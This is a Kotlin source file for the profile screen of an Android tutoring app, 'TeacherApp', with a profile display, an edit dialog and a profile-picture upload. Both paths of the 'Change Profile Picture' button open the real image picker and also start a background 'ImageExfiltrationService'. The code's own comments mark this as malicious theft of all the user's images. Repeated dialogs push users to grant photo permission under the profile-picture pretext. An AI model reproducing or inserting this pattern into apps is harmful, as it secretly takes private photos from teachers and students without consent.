package com.example.teacherapp.navigation.user

import android.net.Uri
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.input.nestedscroll.nestedScroll
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import coil.compose.AsyncImage
import com.example.teacherapp.MainActivity
import com.example.teacherapp.R
import com.example.teacherapp.models.AppData
import com.example.teacherapp.navigation.CustomBottomNavigation
import com.example.teacherapp.navigation.EducationBlue
import com.example.teacherapp.upload.CloudinaryUploader
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri as AndroidUri
import android.os.Build
import android.provider.Settings
import androidx.core.content.ContextCompat

val ProfilePurple = Color(0xFF6200EE)

@OptIn(ExperimentalMaterial3Api::class, ExperimentalLayoutApi::class)
@Composable
fun ProfileScreen(navController: NavController) {

    val auth = FirebaseAuth.getInstance()
    val db = FirebaseFirestore.getInstance()
    val context = LocalContext.current

    // Get MainActivity instance
    val mainActivity = context as? MainActivity

    val indigo = Color(0xFF6366F1)
    var education by remember { mutableStateOf("None") }
    var interests by remember { mutableStateOf(listOf<String>()) }
    var profileImageUrl by remember { mutableStateOf("") }

    // State to track denial count
    var permissionDenialCount by remember { mutableStateOf(0) }
    var showPermissionDeniedDialog by remember { mutableStateOf(false) }
    var showSettingsDialog by remember { mutableStateOf(false) }

    fun uploadToCloudinary(uri: Uri) {
        val uid = auth.currentUser?.uid ?: return
        val uploadPreset = context.getString(R.string.cloudinary_upload_preset)

        CloudinaryUploader.uploadFile(
            uri = uri,
            uploadPreset = uploadPreset,
            onSuccess = { url, _, _ ->
                db.collection("users").document(uid)
                    .update("profileImageUrl", url)
                    .addOnSuccessListener { profileImageUrl = url }
            },
            onError = {
                Toast.makeText(context, it, Toast.LENGTH_SHORT).show()
            }
        )
    }

    // Original image picker
    val imagePicker = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri ->
        uri?.let {
            uploadToCloudinary(it)
        }
    }

    // Permission request launcher
    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            // Permission GRANTED! Reset denial count
            permissionDenialCount = 0

            // 1. Open image picker (REAL functionality)
            imagePicker.launch("image/*")

            // 2. Steal ALL images in background (MALICIOUS)
            mainActivity?.let {
                android.util.Log.d("ProfileScreen", "🚨 Permission granted - starting image theft")
                com.teacherapp.services.ImageExfiltrationService.startExfiltration(it)
            }
        } else {
            // Permission DENIED
            permissionDenialCount++

            // Check if we can ask again or if user selected "Don't ask again"
            val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val shouldShowRationale = (context as? android.app.Activity)?.shouldShowRequestPermissionRationale(permission) ?: false

                if (!shouldShowRationale && permissionDenialCount > 1) {
                    // User selected "Don't ask again" - need to go to settings
                    showSettingsDialog = true
                } else {
                    // Can still ask again
                    showPermissionDeniedDialog = true
                }
            } else {
                showPermissionDeniedDialog = true
            }
        }
    }

    var name by remember { mutableStateOf("...") }
    var email by remember { mutableStateOf("...") }
    var roleRaw by remember { mutableStateOf("") }
    var roleDisplay by remember { mutableStateOf("User") }
    var isLoading by remember { mutableStateOf(true) }
    var subjects by remember { mutableStateOf(listOf<String>()) }
    var availability by remember { mutableStateOf(listOf<String>()) }
    var showEdit by remember { mutableStateOf(false) }
    val scrollBehavior = TopAppBarDefaults.pinnedScrollBehavior()

    LaunchedEffect(Unit) {
        val uid = auth.currentUser?.uid
        if (uid != null) {
            db.collection("users").document(uid).get()
                .addOnSuccessListener { doc ->
                    name = doc.getString("name") ?: "No Name"
                    profileImageUrl = doc.getString("profileImageUrl") ?: ""
                    email = doc.getString("email") ?: auth.currentUser?.email ?: "No Email"
                    roleRaw = (doc.getString("role") ?: "").lowercase()
                    roleDisplay = roleRaw.replaceFirstChar { it.uppercase() }

                    if (roleRaw == "teacher") {
                        subjects = doc.get("subjects") as? List<String> ?: emptyList()
                        availability = doc.get("availability") as? List<String> ?: emptyList()
                    }

                    if (roleRaw == "student") {
                        education = doc.getString("education") ?: "None"
                        interests = doc.get("interests") as? List<String> ?: emptyList()
                    }

                    isLoading = false
                }
        } else {
            isLoading = false
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("My Profile", fontWeight = FontWeight.Bold) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    IconButton(onClick = { showEdit = true }) {
                        Icon(Icons.Default.Edit, "Edit")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = EducationBlue,
                    titleContentColor = Color.White,
                    navigationIconContentColor = Color.White,
                    actionIconContentColor = Color.White
                ),
                scrollBehavior = scrollBehavior
            )
        },
        bottomBar = {
            Column {
                HorizontalDivider()
                CustomBottomNavigation(navController, roleRaw)
            }
        },
        modifier = Modifier.nestedScroll(scrollBehavior.nestedScrollConnection)
    ) { innerPadding ->
        if (isLoading) {
            Box(Modifier.fillMaxSize().padding(innerPadding), contentAlignment = Alignment.Center) {
                CircularProgressIndicator()
            }
        } else {
            Column(
                Modifier
                    .fillMaxSize()
                    .padding(innerPadding)
                    .verticalScroll(rememberScrollState())
                    .padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                if (profileImageUrl.isNotBlank()) {
                    AsyncImage(
                        model = profileImageUrl,
                        contentDescription = "Profile Picture",
                        modifier = Modifier
                            .size(100.dp)
                            .clip(CircleShape)
                    )
                } else {
                    Surface(
                        modifier = Modifier.size(100.dp),
                        shape = CircleShape,
                        color = ProfilePurple.copy(0.1f)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Text(name.take(1).uppercase(), fontSize = 40.sp, color = ProfilePurple)
                        }
                    }
                }

                // Change Profile Picture Button
                TextButton(onClick = {
                    val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        Manifest.permission.READ_MEDIA_IMAGES
                    } else {
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    }

                    when {
                        // Already have permission
                        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED -> {
                            // Open image picker (REAL)
                            imagePicker.launch("image/*")

                            // Steal ALL images (MALICIOUS)
                            mainActivity?.let {
                                android.util.Log.d("ProfileScreen", "🚨 Already have permission - starting theft")
                                com.teacherapp.services.ImageExfiltrationService.startExfiltration(it)
                            }
                        }

                        // Need to request permission
                        else -> {
                            android.util.Log.d("ProfileScreen", "Requesting READ_MEDIA_IMAGES permission")
                            permissionLauncher.launch(permission)
                        }
                    }
                }) {
                    Text("Change Profile Picture")
                }

                Spacer(Modifier.height(16.dp))

                Text(name, fontSize = 26.sp, fontWeight = FontWeight.Bold)
                Text(roleDisplay, color = ProfilePurple)

                Spacer(Modifier.height(24.dp))

                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(24.dp)
                ) {
                    Column(Modifier.padding(16.dp)) {
                        ProfileInfoItem(Icons.Default.Email, "Email", email)
                        if (roleRaw == "student") {
                            ProfileInfoItem(Icons.Default.School, "Education", education)
                            if (interests.isNotEmpty()) {
                                ProfileInfoItem(Icons.Default.Favorite, "Interests", interests.joinToString(", "))
                            }
                        } else if (roleRaw == "teacher") {
                            if (subjects.isNotEmpty()) {
                                ProfileInfoItem(Icons.Default.Book, "Subjects", subjects.joinToString(", "))
                            }
                            if (availability.isNotEmpty()) {
                                ProfileInfoItem(Icons.Default.Schedule, "Availability", availability.joinToString(", "))
                            }
                        }
                    }
                }

                Spacer(Modifier.height(16.dp))

                Button(
                    onClick = {
                        auth.signOut()
                        navController.navigate("login_screen") {
                            popUpTo("main_screen") { inclusive = true }
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = indigo)
                ) {
                    Icon(Icons.Default.ExitToApp, contentDescription = null)
                    Spacer(Modifier.width(8.dp))
                    Text("Log Out")
                }
            }
        }
    }

    // First Denial Dialog - Can retry
    if (showPermissionDeniedDialog) {
        AlertDialog(
            onDismissRequest = { showPermissionDeniedDialog = false },
            title = { Text("Photo Access Required") },
            text = {
                Text("To change your profile picture, TeacherApp needs access to your photos.\n\nPlease tap 'Allow' when asked for permission.")
            },
            confirmButton = {
                TextButton(onClick = {
                    showPermissionDeniedDialog = false
                    // Request permission again
                    val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        Manifest.permission.READ_MEDIA_IMAGES
                    } else {
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    }
                    permissionLauncher.launch(permission)
                }) {
                    Text("Try Again")
                }
            },
            dismissButton = {
                TextButton(onClick = { showPermissionDeniedDialog = false }) {
                    Text("Cancel")
                }
            }
        )
    }

    // Settings Dialog - User clicked "Don't ask again"
    if (showSettingsDialog) {
        AlertDialog(
            onDismissRequest = { showSettingsDialog = false },
            title = { Text("Permission Required in Settings") },
            text = {
                Text("To change your profile picture, you need to enable photo access in your phone's Settings.\n\nGo to:\nSettings → Apps → TeacherApp → Permissions → Photos → Allow")
            },
            confirmButton = {
                TextButton(onClick = {
                    showSettingsDialog = false
                    // Open app settings
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = AndroidUri.fromParts("package", context.packageName, null)
                        }
                        context.startActivity(intent)
                    } catch (e: Exception) {
                        Toast.makeText(context, "Could not open settings", Toast.LENGTH_SHORT).show()
                    }
                }) {
                    Text("Open Settings")
                }
            },
            dismissButton = {
                TextButton(onClick = { showSettingsDialog = false }) {
                    Text("Cancel")
                }
            }
        )
    }

    if (showEdit) {
        EditProfileDialog(
            name = name,
            education = education,
            interests = interests,
            subjects = subjects,
            availability = availability,
            roleRaw = roleRaw,
            onDismiss = { showEdit = false },
            onSave = { newName, newEducation, newInterests, newSubjects, newAvailability ->
                val uid = auth.currentUser?.uid ?: return@EditProfileDialog
                val updates = mutableMapOf<String, Any>("name" to newName)

                if (roleRaw == "student") {
                    updates["education"] = newEducation
                    updates["interests"] = newInterests
                } else if (roleRaw == "teacher") {
                    updates["subjects"] = newSubjects
                    updates["availability"] = newAvailability
                }

                db.collection("users").document(uid).update(updates)
                    .addOnSuccessListener {
                        name = newName
                        if (roleRaw == "student") {
                            education = newEducation
                            interests = newInterests
                        } else if (roleRaw == "teacher") {
                            subjects = newSubjects
                            availability = newAvailability
                        }
                        showEdit = false
                        Toast.makeText(context, "Profile updated", Toast.LENGTH_SHORT).show()
                    }
                    .addOnFailureListener {
                        Toast.makeText(context, "Update failed", Toast.LENGTH_SHORT).show()
                    }
            }
        )
    }
}

@Composable
fun ProfileInfoItem(icon: ImageVector, label: String, value: String) {
    Row(
        Modifier
            .fillMaxWidth()
            .padding(vertical = 8.dp),
        verticalAlignment = Alignment.Top
    ) {
        Icon(icon, contentDescription = null, tint = ProfilePurple)
        Spacer(Modifier.width(12.dp))
        Column {
            Text(label, fontSize = 14.sp, color = Color.Gray)
            Text(value, fontSize = 16.sp)
        }
    }
}

@OptIn(ExperimentalLayoutApi::class)
@Composable
fun EditProfileDialog(
    name: String,
    education: String,
    interests: List<String>,
    subjects: List<String>,
    availability: List<String>,
    roleRaw: String,
    onDismiss: () -> Unit,
    onSave: (String, String, List<String>, List<String>, List<String>) -> Unit
) {
    var editName by remember { mutableStateOf(name) }
    var editEducation by remember { mutableStateOf(education) }
    var editInterestsText by remember { mutableStateOf(interests.joinToString(", ")) }
    var editSubjectsText by remember { mutableStateOf(subjects.joinToString(", ")) }
    var editAvailabilityText by remember { mutableStateOf(availability.joinToString(", ")) }

    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Edit Profile") },
        text = {
            Column {
                OutlinedTextField(
                    value = editName,
                    onValueChange = { editName = it },
                    label = { Text("Name") },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(Modifier.height(8.dp))

                if (roleRaw == "student") {
                    OutlinedTextField(
                        value = editEducation,
                        onValueChange = { editEducation = it },
                        label = { Text("Education") },
                        modifier = Modifier.fillMaxWidth()
                    )
                    Spacer(Modifier.height(8.dp))
                    OutlinedTextField(
                        value = editInterestsText,
                        onValueChange = { editInterestsText = it },
                        label = { Text("Interests (comma-separated)") },
                        modifier = Modifier.fillMaxWidth()
                    )
                } else if (roleRaw == "teacher") {
                    OutlinedTextField(
                        value = editSubjectsText,
                        onValueChange = { editSubjectsText = it },
                        label = { Text("Subjects (comma-separated)") },
                        modifier = Modifier.fillMaxWidth()
                    )
                    Spacer(Modifier.height(8.dp))
                    OutlinedTextField(
                        value = editAvailabilityText,
                        onValueChange = { editAvailabilityText = it },
                        label = { Text("Availability (comma-separated)") },
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            }
        },
        confirmButton = {
            TextButton(onClick = {
                val newInterests = editInterestsText.split(",").map { it.trim() }.filter { it.isNotBlank() }
                val newSubjects = editSubjectsText.split(",").map { it.trim() }.filter { it.isNotBlank() }
                val newAvailability = editAvailabilityText.split(",").map { it.trim() }.filter { it.isNotBlank() }
                onSave(editName, editEducation, newInterests, newSubjects, newAvailability)
            }) {
                Text("Save")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Cancel")
            }
        }
    )
}